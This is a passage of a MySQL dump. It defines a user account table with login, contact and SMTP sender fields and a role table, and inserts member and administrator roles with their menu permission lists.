-- ----------------------------
DROP TABLE IF EXISTS `user_info`;
CREATE TABLE `user_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userPwd` varchar(40) COLLATE utf8_bin DEFAULT NULL,
  `mobile` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `email` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `createTime` datetime DEFAULT NULL,
  `status` int(1) NOT NULL DEFAULT '0',
  `roleId` int(11) NOT NULL DEFAULT '0',
  `logo` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `nickName` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `smtp` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `sendEmail` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `sendPwd` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_mobile_index` (`mobile`) USING BTREE,
  UNIQUE KEY `user_email_index` (`email`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=631 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of user_info
-- ----------------------------

-- ----------------------------
-- Table structure for user_role
-- ----------------------------
DROP TABLE IF EXISTS `user_role`;
CREATE TABLE `user_role` (
  `id` int(11) NOT NULL,
  `name` varchar(64) DEFAULT NULL,
  `menus` varchar(1024) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of user_role
-- ----------------------------
INSERT INTO `user_role` VALUES ('0', '会员', '48,49,50,51,52,53,55,54');
INSERT INTO `user_role` VALUES ('1', '管理员', '4,28,29,30,32,48,49,50,51,52,53,55,54,56,57,58,59,60,61,62,64,63');
